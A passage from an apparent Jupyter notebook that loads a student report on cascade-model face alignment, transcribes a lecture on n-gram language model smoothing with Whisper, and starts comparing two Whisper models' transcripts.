      "page_content=\"Face Alignment on 44 landmarks by Cascade Model\\n\\nCandidate No. : 263156\\n\\nMay 2023\\n\\nUniversity of Sussex\\n\\nAbstract Face alignment, also known as face key point detection, is the basis for many face-related tasks such as face detection, expression analysis, etc. It detects a predefined set of face key points (e.g. eyes, eyebrows, nose, mouth etc.) for a given face. It is the task of detecting a pre-defined set of face key points (e.g. eyes, eyebrows, nose, mouth, etc.) for a given face. This report uses a cascade model to perform 44 face keypoint detection. It also covers some attempts to improve the performance of simple CNN models and some analysis of failure cases.\\n\\nIntroduction Face key points can reflect some critical features of the face and are essential for face-related machine-learning tasks. The training dataset for this assignment is divided into two parts, a full 44-keypoint face keypoint dataset and a missing dataset with only five key points to improve model performance. I have tried two main models, a cascade model and a ResNet18 model trained with the full dataset (He, 2016) for comparison with the cascade model. The cascade model has two stages (Feng et al., 2018). The first stage is a ResNet18 model that predicts five key points. The face image is corrected based on the five points output by the first stage model and then fed into the second stage ResNet50 model. In addition, I tried various data augmentation methods and Wing loss to train the model, but the results were not very good. The exact results and analysis will be given later. The detailed implementation and code for this assignment can be found at https://github.com/Xiao001010/FaceAlignment. I will make this repository public after the 20th of May. But I will also submit it with my homework. Models ResNet Before the advent of Vision Transformer, the ResNet model and its variants were commonly used in computer vision tasks. The main difference between ResNet and traditional convolutional neural networks such as LeNet and AlexNet is that ResNet uses residual connections between the different blocks, as shown in Figure 1 and Equation 1 (He et al., 2016).\\n\\nIf the shape of x is different from the shape of the features output by F(x) here, the features x are first downsampled by the downsample module into the same shape as the output features before being summed. This not only preserves the original features but also solves the problem of gradient explosion and gradient disappearance in deeper networks. (1)\\n\\nFigure 1 | Residual Connection (He et al., 2016). The ResNet structure is shown in Figure 2. ResNet has five stages of convolutional neural networks and a pooling layer with a fully connected layer at the end. Each stage consists of several BasicBlocks (ResNet18, 34) or BottleNeck blocks (ResNet50, 101, 152), each of which reduces the size of the features by half (He et al., 2016). The first stage of ResNet18 and 34 raises the number of channels from 3 to 64, the second stage will maintain 64 channels, and the following three stages will all output double the number of channels from the previous stage. And details of the channel transformations for ResNet50,101 and 152 can be found in Figure 2 and comments in the code. The number of outputs needed for the task is output at the final fully connected layer. In Figure 2, the probabilities of 1000 categories are output according to the requirements of the ImageNet task, and the coordinates of 44 key points i.e. 88 values will be output in this task. The ResNet input image size is the same as the ImageNet three-channel 224x224 image, so I also resized the data from 256x256 to 224x224 in the input (I also processed the landmarks accordingly).\\n\\nFigure 2 | ResNet Structure (He et al. 2016) Space is limited here, and I cannot describe the ResNet model in more detail. But I believe that most CV workers are already familiar with ResNet, so there is no need to go into too much detail on it. Cascade Model As shown in Figure 3, the cascade model is divided into two stages. The first stage consists of ResNet18, which will output five key points. The coordinates of the first and second key points, i.e. the left and right eye corners, are taken from the five key points output by the first stage model to calculate the angle of the corrected face. Then the image is corrected by warpAffine in OpenCV (if training, the coordinates of the 44 key points are also corrected at the same angle). The corrected face image is then fed into the second stage ResNet50 model, and the 44 keypoint coordinates are output, as shown in Figure 3. It is important to note here that since the input was resized to 224x224, the image and the predicted key points are not only restored to their original angles based on the angles used to correct the face after the first stage, but the image and the output key points are also resized to 256x256.\\n\\nAccording to Feng's paper (2018), his first stage model uses a shallow convolutional neural network to extract coarse-grained features, while the second stage uses a deeper network to extract finer-grained features, so I used ResNet18 to predict five key points in the first stage and a deeper ResNet50 to extract a finer 44 face keypoints in the second stage.\\n\\nFigure 3 | Cascade Model. Data There are two datasets used for training, a missing dataset with only five points labelled, containing 1386 three-channel face images and five key points corresponding to each image, and a complete dataset with 44 points labelled, containing a total of 1425 data. The task is to predict the 44 key points of the face. I split the complete dataset into a training set (1140 images) and a validation set (285 images) on a scale of 0.8. The validation set was used to evaluate the model's performance for each training epoch to determine whether the model works and is over-fitted. The Normalized Mean Error (NME) of the model on the validation set was also calculated, and the model was saved when the NME dropped. This assignment focused on training a cascade model and a ResNet18 model for comparison with the cascade model. The ResNet18 model for the first stage of the cascade model was trained with the training set obtained by splitting together with a missing dataset with only five points labelled (only five key points in the full dataset were taken for training). Again, only five points in the validation set were taken to evaluate the model. The second stage of the cascade model, the ResNet50 model, was only trained with the training set obtained by splitting. The ResNet18 model, used for comparison with the cascade model, was trained using only the split training set.\\n\\nPreprocess Since the general image input size for ResNet is 224x224, I first resized the image from 256x256 to 224x224 while doing the corresponding processing for the key points of the face. In fact, since the last stage of ResNet uses AdaptiveAvgPool2d, the input image size does not need to be fixed at 224x224, a 256x256 image can also be trained, but I did not know this until after I had finished training. I then normalised the image to speed up the convergence of the model by subtracting the mean and dividing by the standard deviation, then dividing by 255 to compress the pixel values to between 0 and 1. Here I used the default mean of 128 and std127.5 from torchlm.LandmarksNormalize (DefTruth and Lalu, 2022), it would have made more sense to use the mean and standard deviation calculated on the current dataset or the values calculated on ImageNet. Finally, the data type was converted to the Tenser data type. Augmentation In this assignment, I tried many data augmentation methods such as light, shadows, masks, translation, shearing, multiscale, slight angle rotation and blur, as shown in Figure 5. Most were implemented through the torchlm library (DefTruth and Lalu, 2022). As I felt that the Brightness and Mask data augmentations in torchlm were ineffective, I customised the Light, Shadow and Mask methods. However, I found that the custom data augmentation methods were very time-consuming when training.\\n\\ntorchlm's Brightness is a change to the global brightness, I customised the Light and Shadow methods to transform the local brightness, as circled in red in Figure 5. This is more consistent with the reality of light on a face and shadows on a face. The mask in torchlm is too irregular, so I customised a Mask method to generate a square mask. I didn't use a horizontal flip here because the order of the coordinates of the key points after the flip would be the opposite of the defined order (as circled in yellow in Figure 5), which is also similar to the slight angle rotation. Finally, I have combined Light, Shadow, Mask, Translate, Shear, Scale, Rotate, Blur, Resize, Normalization, and ToTensor with the function Compose to get the final data augmentation. Although data augmentation doesn't work as well as training without it, it is a common way to improve model performance nowadays. This result may be because most faces in the dataset we were provided with were already at the same scale, and finding the appropriate data augmentation method was complex. Train I did a lot of experimentation in training the models to find the most suitable configuration and parameters for each model, but this also took much of my time.\\n\\nFor this assignment, I used NME to evaluate the performance of the model, as defined in Equation 2, where  and  are the coordinates of the predicted and ground-truth landmarks, respectively, M is the number of landmarks and  is the normalisation factor, here using the interocular distance, which is the distance between the outer corners of the eyes (Huang et al., 2021). I tried the Mean Square Error (MSE) loss function and Wing Loss (whose definition is shown in Figure 4), allowing the model to focus more on details (Feng et al., 2018). However, the final experimental results indicated that the NME of the Wing Loss trained model was not as good as that of the MSE trained one. I think this may be because I just used the default parameters of Wing Loss and did not delve into the choice of these two parameters. In addition, I used the Adam optimiser and an exponential scheduler for the learning rate. For most experiments, the exponential learning rate scheduler used a gamma of 0.8 (the learning rate is multiplied by the gamma for each epoch). The lack of careful adjustment of the gamma value of the exponential learning rate scheduler may also be another reason for the poor results of part of the models. (2)\\n\\nFigure 4 | Wing Loss (Feng et al., 2018). The best configuration and hyperparameters for each model are shown in Table 1. Further details of the experiments can be found in the results.xlsx file in the results folder, where each experiment's configuration parameters and results are recorded. You can also see the process of each experiment in the logs folder. In addition, I have saved the loss, NME, etc., of each experiment in the runs folder via tensorboard. I uploaded the best model parameters to Google Drive, which can be found as a link in README.md. If you want to run the training, run the main.py file after downloading the data and checkpoints files, you can also change the configuration file in the config to suit your needs. For inference, you need to run the Inference.py file.\\n\\nTable 1 | Best hyperparameters for each model.\\n\\nFigure 5 | Data Augmentation on Face Alignment Data (DefTruth & Lalu, 2022). Blue-coloured forks represent face key points, and red-coloured forks indicate the first point in the key points. Results Quantitative Analysis As shown in Table 1, the ResNet18 model trained with the complete 44 landmark datasets achieved an NME of 5.580%. Whereas the NME of the cascade model trained using two datasets reached 5.349%. Qualitative Analysis Figure 6 shows the three examples I selected from the validation and test sets. Figure 7 compares the output of the two models on the EXAMPLES images, where the difference between the two models is more apparent in the second, fourth and fifth images. We can find that the cascade model is more accurate than the regular ResNet18 for these refinement key points in the eye area, such as the part of the eye circled in yellow in Figure 6 and Figure 7. This may be because the second stage of the cascade model using the ResNet50 model with more layers can extract more refined features. But the cascade model does not predict the right eye better than the regular ResNet18 in the second image in Figure 7. This may be due to a problem with the key point of the right eye predicted by the first stage model, which ultimately led to this bias due to the second stage model accepting images rotated at the wrong angle. Furthermore, the cascade model is better represented in the mouth section of the third picture in Figure 6.\\n\\nThis is not only because the deeper network can extract finer features but also benefits from the correction operations performed on the face based on the output of the first stage model.\\n\\nFigure 6 | Qualitative analysis of test images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Blue-coloured forks indicate landmarks predicted by the model, while red-coloured forks indicate ground-truth landmarks. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model.\\n\\nFigure 7 | Qualitative analysis of examples images. The first row shows the results of the regular ResNet18, and the second row shows the results of the cascade model. Circled in yellow are the parts of the cascade model that performed better than the regular ResNet18 model, while circled in red are the parts of the regular ResNet18 that performed better than the cascade model.\\n\\nFailure Case After this task, I found the following shortcomings in my model: Firstly, although the first stage model is a good solution for faces rotated in the plane, the model does not behave very well if there are faces rotated not in the plane but in other geometric angles in 3D space as in the first picture in Figure 6. The solution to this problem that I can think of at the moment is to solve it by 3D face alignment, which requires using 3D face landmark data for training. Second, as mentioned in the qualitative analysis, a prediction error in the first stage could easily affect the model's performance in the second stage with an error such as the one on the right eye in the second image in Figure 7. This requires us to improve the performance of the first stage model through various strategies, such as more training data, appropriate data augmentation methods, better hyperparameters, etc. Finally, the model does not predict the mouth part of the face very well, as in the second image in Figure 6 and the fifth image in Figure 7, where the model predicts a mouth shape that is easily larger than the real one. This may require us to collect more face landmarks with richer mouth-shape data. Discuss For this assignment, I solved the problem of different faces in face alignment angles by cascading the model while using missing data from five landmarks, thus improving the model's performance.\\n\\nHowever, the following points need to be improved: Firstly, the data pre-processing did not consider removing the noisy data like the first graph of Figure 6. Secondly, no suitable data augmentation solution was found. Finally, using a gamma of 0.8 for most of the learning rate exponential schedulers did not allow the model to converge well when the model was tuned. Reference DefTruth and Lalu, Y.E.M. (2022) Torch Lm: A PyTorch Landmarks-Only Library (Version v0.1.6.10). , GitHub. Available at: https://github.com/DefTruth/torchlm (Accessed: April 26, 2023). Feng, Z.-H. et al. (2018) “Wing loss for robust facial landmark localisation with convolutional neural networks,” 2018 IEEE/CVF Conference on Computer Vision and Pattern Recognition [Preprint]. Available at: https://doi.org/10.1109/cvpr.2018.00238. He, K. et al. (2016) “Deep residual learning for image recognition,” 2016 IEEE Conference on Computer Vision and Pattern Recognition (CVPR) [Preprint]. Available at: https://doi.org/10.1109/cvpr.2016.90. Huang, Y. et al. (2021) “Adnet: Leveraging error-bias towards normal direction in face alignment,” 2021 IEEE/CVF International Conference on Computer Vision (ICCV) [Preprint]. Available at: https://doi.org/10.1109/iccv48922.2021.00307. MMPose Contributors (2020) OpenMMLab Pose Estimation Toolbox and Benchmark (Version v1.0.00). , GitHub. Available at: https://github.com/open-mmlab/mmpose (Accessed: April 26, 2023).\" metadata={'source': 'docs/FaceAlignmentReport.txt'}\n"
     ]
    }
   ],
   "source": [
    "filepath = \"docs/FaceAlignmentReport.txt\"\n",
    "loader = UnstructuredFileLoader(filepath)\n",
    "pages = loader.load()\n",
    "print(f\"Loaded {len(pages)} pages.\")\n",
    "print(pages[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Transcript Audio to text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/haoxu/anaconda3/lib/python3.11/site-packages/whisper/transcribe.py:115: UserWarning: FP16 is not supported on CPU; using FP32 instead\n",
      "  warnings.warn(\"FP16 is not supported on CPU; using FP32 instead\")\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Hi, and welcome back to the week three lecture, where we're talking about N-gram language modelling. In this part, we're going to be talking about generalisation in the models. So we're going to start by thinking about our models and how we might use them to generate previously unseen language. To do that, what I want us to do is consider a very, very small toy bigram model, which we might imagine has been trained on this very, very small corpus here. Just three sentences here, just to get us to think about what these models might look like. And so we can represent these models as a kind of table or matrix. And here we have word one, and here we have word two. If this was a trigram model, we could actually here have the two previous words, or a quadricam, the three previous words. But here, what I'm imagining is this table is a bigram model, and it's telling us the probability of word two, that's the word along here, given that the previous word was word one. And we have this thing called a start token, and we have an end token. So actually, when we see a sentence like I like to cook Chinese food, we have a start token at the beginning, and an end token at the end. And what we can see is, if we look at the fact that we've got three sentences, that means we've got three start tokens, and we can think about which words can go at the start of a sentence. And that's what we have in this row here. And we see that I is occurring in two out of three times, and they is occurring in one out of three times. Obviously, a real bigram model, a real language model would be trained on much larger corpus, and we'd see a lot more different things occurring at the start of sentences. But as I said, this is a kind of toy, just to illustrate the probabilities, and then also how we can use them to generate. So that's the start, and then we can see if we go on. Okay, so what can happen after I? Well, the words that we see after I in the corpus are like and want, and they occur in the two occurrences of I. And in one case, we've got like following I, and in the other case, we've got want following I. So we see here in the table that we've got a probability of a half for the probability of like given I, and a probability of a half for want given I. And you can kind of stop the video and just have a look at this table and check that you understand how all of these probabilities would be generated from the co-occurrence counts. And my next, I've just shown what happens when we add one more sentence to this corpus. So I've added a fourth sentence, they eat Chinese dinner. So now we see that with four sentences, four start tokens, half of them have I, and half of them start with they. And similarly, in the case of what can happen after the word they, we now have a half for want, and a half for each rather than on the previous slide, where we saw that they was always essentially had to be followed by want. So what we can do here, and we imagine that actually, you know, we would build this up over a very, very large corpus. But even with this small toy example, we can see how we can use such a model to start to generate sentences, which might seem plausible in the language, but have never actually been occurred before. So we can say, okay, this is a sample of my language, can I have a new sentence that would be likely given the sentences that we have previously seen? So how would we go about doing this? Well, we could use something called the Shannon visualization method. And what we do is we generate a sequence from the language model that we've got as follows. First thing we need to do is say, well, every sentence has to start with a start token. So that's a given. And then we need to know what is going to be the first word in my sentence that I'm generating. And so what we do is we look at the probability distribution, the probability of a word to given the start token, and we choose the first word of the sentence that's going to go after start according to its probability. So here we would look at this distribution here, and we can see that there are two possibilities. Only two things can go at the start. So we have to pick one of these two words. And what we want to do, so if we run this method hundreds of times generating new sentences, we would like to have this same distribution unfollowed. So we want to have a kind of 50-50 chance in each sentence of picking I, and a 50-50 chance in each sentence of picking they. In this particular case, we've got to pick one of them. It's 50-50, I trust a coin, and we came up with I. We then need to generate the next token. So we would go back to our language model and say, well, token, current token is I. What can come after I? So we look at this particular row here, and again, we've got two possibilities, like and want. So we pick one of them at random, and I picked want. What comes after want? And actually, in my corpus, the only thing that ever came after want was two, so I would have to pick two here. What might come next? Well, from two, I've got to pick either cook or eat. Two-thirds of the time, I need to pick eat. One-third of the time, I need to pick cook. This time, I picked the most likely one. That wouldn't always be the case. Not every time I generate a sentence using this method should I pick the most likely one, but I need to pick it two-thirds of the time, so I've picked it here. Then from eat, we need to pick one out of Chinese, dinner, and Indian. So I've picked Chinese, and then from Chinese, I need to choose between dinner and food, and here, I've picked food. And then from food, and the last thing is from food, we have to basically have the end of the sentence because food's always at the end of sentences in this corpus. Nothing else can follow. And so what we've got is the sentence, I want to eat Chinese food, which is plausible, has been generated by this language model. It never occurred in my original corpus, but all of those combinations, the bigram combinations, did occur. And we can do this with different Ngram models, and people have, in the past, had a bit of fun with doing this, tried to approximate Shakespeare. So I've taken the Shakespeare corpus, which is all Shakespeare plays, which has almost a million tokens, a million tokens, and 29,000 different word types, that's the size of vocabulary. And if you use this method with unigrams, this is an example of what you might come up with. So this is just picking, in turn, a unigram based according to its probability. And you might see that, yes, there are some sort of Shakespeare-like words, but it doesn't really make much sense because it's just unigrams. There's no attention to the previous words which have occurred. Then when we go to bigrams, we get something which seems a little bit more meaningful. What means, sir? I confess she, and also he is trim, captain. Maybe it doesn't really make sense, but it seems to almost possibly be, okay, seems like English, but just English that doesn't really make sense. Go to trigram, this shall forbid it, should be branded if we now made it empty. Bit better. And then we go up to our fourgrams, we get something like, King Henry, what? I will go seek the traitor Gloucester. Excellent, some of the watch. A great banquet served in. It cannot be but say. And it starts to actually sound like Shakespeare, but there is actually a problem with this. And this is kind of trying to kind of demonstrate the kind of almost the need to generalise. What's coming out when we kind of have a fourgram model is it looks like Shakespeare because it is actually just bits of Shakespeare, which have been remembered from the text, that the fourgrams are things which have occurred in Shakespeare. So we would generate this and then the next fourgram would have to be something that's come from Shakespeare as well. And so we're not getting any generalisation, we're not really getting anything new. And we can think about this if we again we think about sparsity problem we thought about before. If we actually look at the kind of the training data, which, as I said, was a million tokens over vocabulary of almost 30,000. With 30,000 unigrams, there are almost 840 million possible bigrams. If bigrams could occur, there were no dependencies between the words, which words could occur next to each other. In a corpus of this size, and well, in fact, that it's using actual kind of the English language rules. And what actually Shakespeare wrote, if we count up the different number of bigram types, the different number of distinct bigrams within the Shakespeare corpus, we see that there are 300,000 that have actually occurred. Now, obviously, not all 840 million are actually possible in the language. But actually, what we're seeing here is that 99.96 of what might be possible have zero probabilities. So even at the bigram level, we're really kind of restricting the possibilities here. We're saying that only the ones which actually occurred in the training data could possibly occur. Maybe some of these other ones are also possible. And, you know, this kind of thought, if you think about this, if Shakespeare had written just one more play, there would have been new possibilities, new different bigram, trigram and quadrigram combinations that he would have used, which would then be within our Shakespeare corpus to kind of generate new Shakespeare. So what we want to try to do is avoid overfitting our training corpus. We want our models to be robust. We want them to generalise to unseen data. The idea that the next play might not be exactly the same, contain exactly the same bigrams, trigrams and quadrigrams as our training data. So we're back to the kind of sort of problems that we thought about before when we've been thinking about how to smooth models. And that's what we're going to be now thinking about here in how to kind of generalise our models so that we're not predicting zero probabilities for everything that hasn't been seen before. So this is just an example of this where we've got a training set where we've got what could follow denied the and in the training set we see allegations, reports, claims and requests. But in the test set, we might see things like the loan and the offer. And according if we just use the trained model, we're going to see the probability of offer given denied the would equal zero because it never occurred before in the training set. So we're going to end up assigning zero probability to our test set because we're going to say, well, this is just not possible because it never occurred in the training set. Don't want to do that. So we need to smooth. We need to give some probability mass to these things which have not actually ever been seen before. We talked about this before. Now, remember our intuition for smoothing. When we've got sparse statistics, what we need to do is still some probability mass, some observed events to generalise to the unobserved events. So if we've got these probability counts for a word given denied the, so we've seen allegations three times, reports twice, claims once, requests once. So we've seen a total of seven occurrences of denied the something. What we want to do is steal a little bit away from each of these. So that's what we're doing here on this graph here. We're just taking off a little bit at the top of each of these bits of probability mass, and then we're smoothing out the distribution by giving it to some of these other things which had a zero count originally. So we would take a bit off from each of these and say, oh, we've saved two, two out of seven, and that can be shared between all of the things which haven't been seen before. Again, we've already talked about Adawan, also known as Laplace, where we just take every single possible word. So we would take, in this example here, every single other word in the vocabulary and say, okay, let's just imagine we saw it once in the training data in this context, or maybe not once, maybe it's, we'll give it a count of 0.1, and we'll add that to all of our counts as well. We've already said this in the previous week. This is very effective in some problems, particularly things like text classification, but tends not to be used in language modelling. Because there's going to be too much mass assigned to these unseen occurrences, these models just get huge, with all these kind of just tiny little bits of probability, try to look them up. And actually, we don't necessarily, if we're just going to share it out, we don't need to really necessarily try to kind of enumerate all of those different possibilities. There are other things that we can do, which kind of give the same effect, but be much more efficient, much more effective. And one thing that we can do in the language modelling context is think about unknown words. Test corpus, you know, contains words that the training corpus doesn't. We know that. That's what the problem that we're trying to deal with, these unknown words which are going to come up in the test corpus, which never came up in the training corpus. We'll think about unknown combinations a little bit later, but let's first of all think about the problem, first problem, the easier problem, which is that there are going to be some words in the test corpus that never occurred in the training corpus. Now, conversely, there are also some words in the training corpus that didn't occur in the test corpus. And what we need to think about is, well, which training corpus words are least likely to be in the test corpus? And if we think about that, and you might want to stop the video and think, which training corpus words are least likely to be in the test corpus? Well, it's the ones with the lowest frequency. And these are what we're going to use as to model this idea of the unknown word. What we do is we fix the vocabulary to being the top N words in the training corpus. So, we've seen 30,000 different words in the training corpus. We'll say, okay, 30,000 different words. We're going to say, just take the top 25,000 or top 20,000, or all of the words which occur two or more times. So, that might even be 15,000 as the top N if we're going to require everything to occur at least twice. To think about our hapax legomena from Zipf's Law. So, if we say that we're only going to consider words in our vocabulary if they've occurred at least twice in the training corpus, or conversely, we can think of that as the top 50% of the words in the training corpus. What we then do is we replace all of the occurrences of words which occur less frequently than that within the training corpus with something called an unknown token, which quite often would be expressed like this within our models. But, you know, there's lots of different ways that you might represent the unknown token. But what we actually do is we can either do it to the corpus or we can, generally, we don't do it to the corpus itself. What we generally do is we count up all of the frequencies of all of our words and then we find the words which have occurred less than the threshold and then we place them all within our models with this thing called the unknown token. And that's going to capture probabilities for the out of vocabulary items. And this is something which you'll see quite often referred to in papers. So, it's a good kind of acronym to get your head around. And when you see OOV, what that means is out of vocabulary words, words which we're seeing at test time, which we haven't seen at training time. So, actually, what we're going to do is we're throwing away things that we know about the training corpus and saying, didn't occur enough. We're going to just treat this as an unknown word so that we can also use that to model the unknown words that really do occur at test time. Okay, so this unknown token is going to allow us to estimate the probability of seeing an out of vocabulary word. So, if there are 5% of occurrences in the corpus of the unknown token at training time, we would have that as a unigram probability for an unknown token that might be 5%. So, saying if we've got a sentence that's 20 words long, we would expect to get one unknown word token within it. Or maybe our probability of seeing an OOV word is 10%. So, in a sentence that's 20 words long, we'd get two words. So, in a sentence that's 20 words long, we'd get two words that are unknown or out of vocabulary. So, that's unigram probabilities. That's fine. We now have to think about bigrams. How will that help us with the bigram probabilities? Well, we can certainly get a probability now for the probability of seeing two out of vocabulary words next to each other. How often was unknown seen next to unknown in the training corpus? And we can even use that to predict probabilities for things like in vocabulary word followed by out of vocabulary or out of vocabulary followed by in vocabulary word. So, we've got, by using this unknown token, we can work out probabilities for lots of things for our unknown words at test time. So, that's great. But what it doesn't help with is estimate the probability of two in vocabulary words. So, they're both words which are fairly frequent in the training corpus. We've seen them before. We're not treating them as an unknown word, but they just haven't been seen before together. And this would be like our denied the reports example that we had earlier. All of those words would be in vocabulary in most situations. But we've never seen them before at training time. So, we haven't fixed that problem, but we've fixed some of the problem in terms of how we would deal with very low frequency words. So, what do we do to smooth these probability estimates? Okay. So, something which has been around now a very long time is this idea in language modelling of absolute discounting. This actually goes back over 30 years now. Some work by Church and Gale, where they looked at newswire text and they divided it into training and testing sets. And they said, okay, each bigram count in the training set, what is its average bigram count in the test set? So, if something has occurred, any bigram that has occurred five times in the training corpus, if I look at that bigram again in the testing corpus, what is the average number of times it will have occurred? Now, obviously, some of them may have occurred six times or four times, so on. But average, they found in their experiment was 4.21. And they did this for every bigram count. So, for all of the bigrams that had a bigram count of four in the training set, they've worked out that the average bigram count in the test set was 3.23. And they looked at these numbers and they noticed something. So, you might have already noticed it, but if you haven't, pause the video, have a look, think about those numbers and see what you think about the relationship between the training count and the test count. Okay, so what they noticed is that there seems to be a quite obvious relationship that actually, the count in the test corpus is around 0.75 lower than the count in the training corpus. For training counts of that are two or higher, it's less for the ones than that. And obviously, the zero has gone up. But for anything that is the training count of two or higher, there seems to be around a kind of drop of 0.75 when you go to the test corpus. So, what they did, and this is the kind of principle of absolute discounting, is to take away d. d is a parameter that we can set, but for the training count, a parameter that we can set, but that d might be 0.75 according to our observation here. And then take that away from all of our bigram counts and save that up for our unobserved bigrams. So, what we can imagine is that we've got this big table of bigram counts, the actual observed bigram counts. Before we turn them into probabilities, we take away 0.75 from all of the counts. But then we need to know how that's going to be distributed or how much we've got to share out between the unobserved bigrams. So, we have to keep track of discounts made for each word. So, what we do is that every time we discount a bigram, we add that discount to a dummy token, which gets called lambda, that word. So, we've seen that the words denied and the occur 10 times in the corpus. We take away 0.75 from that, and we add 0.75 to this dummy token lambda occurring after denied. So, that means we've just shifted things around. We haven't actually changed the totals in any way. We've just taken bits off from all of our bigram counts, and we've added them onto this new one. It's kind of a Robin Hood approach. Then what we can do is we can just turn these into probability distributions as we would normally by taking the totals of the frequencies and dividing by that total, which will give us normalized counts or probability estimates for the bigrams. Then we have to work out how we're actually going to use this because at the moment we've just discounted things. But what do we actually do? Well, when we want to estimate the probability of word 2 occurring given we've seen word 1, we look up the observed discounted probabilities. The first thing we do is we look up, well, what does our model actually say about this what does our model actually say about this co-occurrence probability based on the discounted values? Then we add a little bit more to it. What we're saying is that every single word is going to get some proportion of the discounted probability. So, this lambda 1 that's been put aside, we're going to share that out amongst everybody. As I said, it's the Robin Hood approach. Take it away and then share it back out. There's different ways in which we can share it out. Now, the simplest way to share it out is to say that, okay, I'll give the most, the highest proportion of this to words which actually occur more frequently. Because the more frequent words we might imagine would more likely occur given this word that we're seeing here. So, our estimated probability of word 2 given word 1 becomes the discounted probability of seeing word 2 given word 1 plus the discounted probability of seeing lambda given word 1 times by the probability of word 2. So, that's sharing this out and then adding it on. So, provided all of these probabilities, both of these probabilities are non-zero, this whole probability here must also be non-zero. It doesn't matter if this one was zero, if they were never seen together before. This one can be zero, that's fine, because this is always non-zero, provided we've got some discounted probability. We know that, you know, we've at least seen some words together and we have seen our word 2 before. And we've already dealt with the problem of our unseen at the vocabulary words by using the unknown. So, this word 2 could be our unknown as well. That would be absolutely fine. Okay, so that is the absolute discounting interpolation method. There is a kind of variation on this, which says, well, actually, this way of sharing out the probability mass associated with the lambda is unfair, because it's assuming that higher probability words are more likely to be seen in novel word combinations. And this isn't always true. There may be some very high frequency words which only occur in certain word combinations. And in actual fact, the more we've seen that word, that might be more evidence that it can only be seen in certain combinations. And this is called the San Francisco problem, because that's the example that often gets used to explain the problem. The fact that in certain text, say the San Francisco Journal, Francisco will be a very high frequency word, but it only ever occurs after San. So, we don't want to give it, use the interpolation method to give it a high probability of occurring. I mean, other contexts, we want to observe that it tends to be very restricted in the combinations that can occur in. So, the nays and nays smoothing method says don't assign the reserve probability mass according to the unigram probability. So, we change the formula to have this thing called the nays and nays probability of word two. So, that's the difference that we've got here. This was just the unigram probability. Now, we've got this thing called the nays and nays probability of word two. And the nays and nays probability is the probability of a word occurring in a novel word combination. And what we do to work that out based on our training corpus is we look for our word, how many novel word combinations does it occur in, in the training corpus, divided by the total number of distinct word combinations in the corpus. And that's what we use to share out our discounted lambda probability. So, that's kind of one way of doing, an alternative way of doing the smoothing. Actually, in practice, in kind of recent years, both of those kind of methods have kind of become less popular as we've moved to larger and larger language models. The need to do the kind of smoothing is still there, but it's not as important. And people have kind of started to think, do we really need it to be a kind of true probability distribution? Then as we move in next week, we'll talk about newer language models. And again, they have a different way of kind of handling the kind of smoothing problem, completely different way. But even within an Ngram model, if we go very, very large, this is something like the Google Ngram corpus. We've got, just as an example, we look at the kind of five word sequences for, actually, we've got here, what have I got here? I've got saying that there's 1 billion five word sequences over 13 million unique word types. So, that's our vocabulary size. We can get 1 billion different five word sequences. And here we've got some examples of the four grams that might be in the Google Ngram corpus and their counts. So, we can see that we're getting quite high counts of within our corpus. But we still are going to have the same problems. There's still going to be some plausible four grams, five grams, six grams, depending how far we want to go, that never occurred at all within the corpus. So, you can apply things like full nice and nice smoothing to these web scale language models. But actually, in general practice, there's a much simpler algorithm that might be sufficient when you go to language models of this scale. And this is something called stupid back off. Stupid because it's naive. It's not keeping a kind of probability distribution anymore. What it's saying is, okay, if we've got a zero count for a higher order Ngram, we're just going to back off and use a lower order Ngram with a fixed weight. What does that mean? So, it says that if we're trying to work out the probability of a word given the, say, the four previous words, we would look up what the probability is using according to our training corpus and use that provided it's non zero. Otherwise, what we do is we say, well, we've got a zero count for the four previous words. Let's look at the low order Ngram, that's three previous words, and use lambda. And quite often lambda might be something like 0.4, 0.4 times a probability. So, we're just going to use a look at the trigram model and just make it a little bit smaller. And that will mean that we get a non zero probability. Obviously, there's nothing there. We would go to the next lower order Ngram, so the bigram, and we do lambda times lambda times the bigram model to get an estimate for our quadragram. That won't give us a true probability distribution, but it means that we just would never get a zero. So, it's very, very easy to use. And actually, that's kind of quite often what we want is just to imagine that there's just some very, very small probability of everything. Okay, so that's it on our Ngram models. Next week, that's week four, we're going to start looking at neural language models. We'll be looking at feedforward neural networks. We'll be talking about recurrent neural networks and LSTMs. That's our long short term models. And we'll also be looking at both word based and character based language models. Okay, thank you very much and see you in class.\n"
     ]
    }
   ],
   "source": [
    "# import openai\n",
    "# file uploads limited to 25MB for OpenAI Whisper v2 API, so we use Whisper v1 here\n",
    "# audio = \n",
    "\n",
    "import whisper\n",
    "\n",
    "# model = whisper.load_model(\"base.en\")\n",
    "# result = model.transcribe(\"./docs/lecture3_part2.mp4\")\n",
    "model = whisper.load_model(\"large-v2\")\n",
    "result = model.transcribe(\"./docs/lecture3_part2.mp4\", language=\"en\")\n",
    "print(result[\"text\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "28191"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(result[\"text\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "len for large-v3: 28191 cost 28m12.2s on cpu\n",
    "\n",
    "len for base.en: 27673 cost 1m42.2s on cpu"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Check Whisper Output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from whisper.normalizers import EnglishTextNormalizer\n",
    "\n",
    "basefile = open(\"outputs/Whisper-baseEN.txt\", \"r\")\n",
    "largefile = open(\"outputs/Whisper-largev2.txt\", \"r\")\n",
    "\n",
    "base_text = basefile.read()\n",
    "large_text = largefile.read()\n",
    "\n",
    "basefile.close()\n",
    "largefile.close()\n",
    "\n",
    "normalizer = EnglishTextNormalizer()\n",
    "\n",
    "base_text = normalizer(base_text)\n",
    "large_text = normalizer(large_text)\n",
    "\n",
    "base_text = base_text.split(\".\")\n",
    "large_text = large_text.split(\".\")\n",
    "\n",
    "assert len(base_text) == len(large_text), f\"{len(base_text)} != {len(large_text)}\"\n",
    "\n",
